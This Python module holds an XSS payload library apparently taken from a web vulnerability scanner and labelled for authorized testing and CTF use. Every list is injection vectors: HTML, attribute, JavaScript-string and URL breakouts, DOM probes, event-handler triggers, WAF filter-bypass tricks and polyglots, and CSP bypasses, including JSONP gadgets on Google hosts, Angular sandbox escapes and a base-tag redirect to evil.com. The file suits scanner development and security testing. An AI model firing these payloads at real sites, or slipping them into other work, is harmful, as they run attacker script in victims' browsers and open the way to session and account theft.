"""
payloads/xss_payloads.py
────────────────────────
All XSS payload data — extracted from V28 Ultimate Scanner.
Pure data, no logic, no imports required.

FOR AUTHORIZED SECURITY TESTING AND CTF COMPETITIONS ONLY.

Exports
───────
  HTML_PAYLOADS          — standard HTML-context injection vectors
  ATTRIBUTE_PAYLOADS     — attribute-context breakout vectors
  SCRIPT_PAYLOADS        — JavaScript string-context breakout vectors
  URL_PAYLOADS           — href/src/action URI vectors
  DOM_PAYLOADS           — DOM-sink probes (console.log marker)
  EVENT_PAYLOADS         — event-handler vectors
  FILTER_BYPASS_PAYLOADS — case/encoding/whitespace WAF bypass vectors
  CSP_BYPASS_PAYLOADS    — CSP-aware bypass vectors
  ALL_PAYLOADS           — flat list of every payload above
  CONTEXT_MAP            — dict keyed by context name (same data, structured)
"""

from typing import Dict, List

# ──────────────────────────────────────────────────────────────────────────────
# HTML context
# ──────────────────────────────────────────────────────────────────────────────

HTML_PAYLOADS: List[str] = [
    # Classic
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<script>onerror=alert(1)</script>",
    "onclick=prompt(8)><svg/onload=prompt(8)><img src='q' onerror=prompt(8)>",
    "<image/src/onerror=prompt(8)>",
    "<img/src/onerror=prompt(8)>",
    "><svg onload=alert(1)//",
    "</script><svg onload=alert(1)>",
    # V14 extended
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<marquee onstart=alert(1)>",
    "<isindex type=image src=x onerror=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "<form><button formaction=javascript:alert(1)>click",
    "<svg><script>alert(1)</script></svg>",
    "<svg><use href='data:image/svg+xml,<svg id=\"x\" xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>#x'/>",
    "<%2Fscript><script>alert(1)<%2Fscript>",
    "<script src=data:,alert(1)></script>",
    "<script>&#97;lert(1)</script>",
    "<img src=\"x\" onerror=\"&#97;lert(1)\">",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
]

# ──────────────────────────────────────────────────────────────────────────────
# Attribute context (break out of tag attributes)
# ──────────────────────────────────────────────────────────────────────────────

ATTRIBUTE_PAYLOADS: List[str] = [
    "\" autofocus onfocus=alert('XSS') \"",
    "' autofocus onfocus=alert('XSS') '",
    "\" onmouseover=alert('XSS') \"",
    "onmouseover=alert(1)//",
    "autofocus/onfocus=alert(1)//",
    # V14 extended
    "\" onerror=alert(1) \"",
    "' onerror=alert(1) '",
    "\" onload=alert(1) \"",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\" style=\"animation-name:x\" onanimationstart=\"alert(1)\"",
    "\" tabindex=1 onfocus=alert(1) \"",
]

# ──────────────────────────────────────────────────────────────────────────────
# Script context (break out of JS strings)
# ──────────────────────────────────────────────────────────────────────────────

SCRIPT_PAYLOADS: List[str] = [
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "'-alert('XSS')-'",
    "-alert(1)-",
    "-alert(1)//",
    "\\'-alert(1)//",
    "';a=prompt,a()//",
    "\";a=prompt,a()//",
    "-eval(\"window\")-",
    "-prompt(8)-",
    # V14 extended
    "\\u0027;alert(1)//",
    "\\x27;alert(1)//",
    "');alert(1);//",
    "\");alert(1);//",
    "`;alert(1);//",
    "\\\\'​;alert(1);//",
    "+alert(1)+\"",
    "'+alert(1)+'",
]

# ──────────────────────────────────────────────────────────────────────────────
# URL context (href / src / action values)
# ──────────────────────────────────────────────────────────────────────────────

URL_PAYLOADS: List[str] = [
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    # V14 extended
    "javascript:alert(document.domain)",
    "JaVaScRiPt:alert(1)",
    "javascript&#58;alert(1)",
    "javascript&#x3A;alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
]

# ──────────────────────────────────────────────────────────────────────────────
# DOM sink probes (use console.log marker for browser-based detection)
# ──────────────────────────────────────────────────────────────────────────────

DOM_PAYLOADS: List[str] = [
    "<img src=x onerror=console.log('DOM_XSS_PROBE')>",
    "<svg/onload=console.log('DOM_XSS_PROBE')>",
    "'-console.log('DOM_XSS_PROBE')-'",
    "\"-console.log('DOM_XSS_PROBE')-\"",
    "javascript:console.log('DOM_XSS_PROBE')",
    # V14 extended
    "#<img src=x onerror=console.log('DOM_XSS_PROBE')>",
    "?x=<img src=x onerror=console.log('DOM_XSS_PROBE')>",
    "javascript:console.log('DOM_XSS_PROBE')//",
]

# ──────────────────────────────────────────────────────────────────────────────
# Event-handler vectors (user interaction required)
# ──────────────────────────────────────────────────────────────────────────────

EVENT_PAYLOADS: List[str] = [
    "<x contenteditable onblur=alert(1)>lose focus!",
    "<x onclick=alert(1)>click this!",
    "<x oncopy=alert(1)>copy this!",
    "<x oncontextmenu=alert(1)>right click this!",
    "<x contenteditable onfocus=alert(1)>focus this!",
    "<x contenteditable oninput=alert(1)>input here!",
    "<x onmousedown=alert(1)>click this!",
    "<x onmousemove=alert(1)>hover this!",
    "<x onmouseover=alert(1)>hover this!",
    # V14 extended
    "<x onpointerdown=alert(1)>",
    "<x onpointerenter=alert(1)>",
    "<x ontouchstart=alert(1)>",
    "<x oncut=alert(1) contenteditable>cut me",
    "<x onpaste=alert(1) contenteditable>paste here",
    "<x ondrag=alert(1) draggable=true>drag me",
    "<x ondrop=alert(1)>drop here",
    "<x onwheel=alert(1)>scroll me",
    "<x onkeydown=alert(1) tabindex=0>press key",
]

# ──────────────────────────────────────────────────────────────────────────────
# Filter bypass (case, whitespace, encoding tricks)
# ──────────────────────────────────────────────────────────────────────────────

FILTER_BYPASS_PAYLOADS: List[str] = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<<script>alert(1)//<</script>",
    "<script >alert(1)</script >",
    "<script\t>alert(1)</script>",
    "<script/src=data:,alert(1)>",
    "<svg/onload='alert`1`'>",
    "<svg/onload=alert&#40;1&#41;>",
    "<img src=x onerror=alert&#40;1&#41;>",
    "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",  # Full-width chars
    "<script>\u0061lert(1)</script>",
    "<img src=x onerror=\u0061lert(1)>",
    # Null byte / comment tricks
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<scr\nip\tt>alert(1)</scr\nip\tt>",
    "<!-- --><script>alert(1)</script>",
    # Polyglots
    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
]

# ──────────────────────────────────────────────────────────────────────────────
# CSP bypass payloads
# ──────────────────────────────────────────────────────────────────────────────

CSP_BYPASS_PAYLOADS: List[str] = [
    # JSONP / script gadgets
    "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>",
    "<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>",
    # Angular sandbox (older versions)
    "{{constructor.constructor('alert(1)')()}}",
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
    # base-uri injection
    "<base href='//evil.com/'>",
    # Meta refresh
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    # Script nonce guess (fuzzing, will fail most CSP but flags misconfiguration)
    "<script nonce=AAAA>alert(1)</script>",
    # data: URI when allowed
    "<object data='data:text/html,<script>alert(1)</script>'>",
    # SVG foreignObject
    "<svg><foreignObject><div xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></div></foreignObject></svg>",
]

# ──────────────────────────────────────────────────────────────────────────────
# Structured map (mirrors scanner's self.xss_payloads dict)
# ──────────────────────────────────────────────────────────────────────────────

CONTEXT_MAP: Dict[str, List[str]] = {
    "html":          HTML_PAYLOADS,
    "attribute":     ATTRIBUTE_PAYLOADS,
    "script":        SCRIPT_PAYLOADS,
    "url":           URL_PAYLOADS,
    "dom":           DOM_PAYLOADS,
    "events":        EVENT_PAYLOADS,
    "filter_bypass": FILTER_BYPASS_PAYLOADS,
    "csp_bypass":    CSP_BYPASS_PAYLOADS,
}

# ──────────────────────────────────────────────────────────────────────────────
# Flat list of everything (for callers that don't care about context)
# ──────────────────────────────────────────────────────────────────────────────

ALL_PAYLOADS: List[str] = [
    p for payloads in CONTEXT_MAP.values() for p in payloads
]
